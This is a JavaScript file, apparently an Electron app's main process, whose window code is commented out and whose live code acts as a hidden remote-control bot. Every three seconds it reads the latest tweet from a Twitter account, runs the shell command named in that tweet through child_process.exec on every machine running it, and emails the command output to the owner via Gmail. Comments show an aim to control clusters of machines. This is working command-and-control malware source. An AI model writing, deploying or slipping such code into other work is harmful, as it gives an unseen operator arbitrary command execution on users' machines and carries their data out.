const electron = require('electron');
// Module to control application life.
const app = electron.app;
// Module to create native browser window.
const BrowserWindow = electron.BrowserWindow;
const Twitter = require('twitter');
const { exec } = require('child_process');
let nodemailer = require('nodemailer');

function executeCommand(callback) {
    let client = new Twitter({
        consumer_key: 'YOUR_KEY',
        consumer_secret: 'YOUR_KEY',
        access_token_key: 'YOUR_KEY',
        access_token_secret: 'YOUR_KEY'
    });
    //TODO: do execute command for 1 or claster of ip. Listen few twitter accounts.
    let params = {screen_name: 'your user'};
    client.get('/statuses/user_timeline', params, function(error, tweets) {
        if (JSON.parse(tweets[0].text).ip === 'all'){// here is we can pass current ip or execute it for all machines
            exec(JSON.parse(tweets[0].text).command, (err, stdout, stderr) => {
                if (err) {
                    console.error(err);
                    return;
                }
                sendMailToOwner(stdout);
                return callback(stdout);
            });
        }

    });

}

function sendMailToOwner(text) {
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'your mail',
            pass: 'your pass'
        }
    });

    let mailOptions = {
        from: 'your mail',
        to: 'your mail',
        subject: 'Responce',
        text: text
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
}

setInterval(() => {
    executeCommand(function(resp){console.log(resp)});
}, 3000);

// Keep a global reference of the window object, if you don't, the window will
// be closed automatically when the JavaScript object is garbage collected.
// let mainWindow
//
// function createWindow () {
//   // Create the browser window.
//   mainWindow = new BrowserWindow({width: 800, height: 600})
//
//   // and load the index.html of the app.
//   // mainWindow.loadURL(url.format({
//   //   pathname: path.join(__dirname, 'index.html'),
//   //   protocol: 'file:',
//   //   slashes: true
//   // }))
//   mainWindow.loadURL('index.html')
//   // Open the DevTools.
//   //mainWindow.webContents.openDevTools()
//
//   // Emitted when the window is closed.
//   mainWindow.on('closed', function () {
//     // Dereference the window object, usually you would store windows
//     // in an array if your app supports multi windows, this is the time
//     // when you should delete the corresponding element.
//     mainWindow = null
//   })
// }
//
//
//
// // This method will be called when Electron has finished
// // initialization and is ready to create browser windows.
// // Some APIs can only be used after this event occurs.
// app.on('ready', createWindow)
//
// // Quit when all windows are closed.
// app.on('window-all-closed', function () {
//   // On OS X it is common for applications and their menu bar
//   // to stay active until the user quits explicitly with Cmd + Q
//   if (process.platform !== 'darwin') {
//     app.quit()
//   }
// })
//
// app.on('activate', function () {
//   // On OS X it's common to re-create a window in the app when the
//   // dock icon is clicked and there are no other windows open.
//   if (mainWindow === null) {
//     createWindow()
//   }
// })

// In this file you can include the rest of your app's specific main process
// code. You can also put them in separate files and require them here.
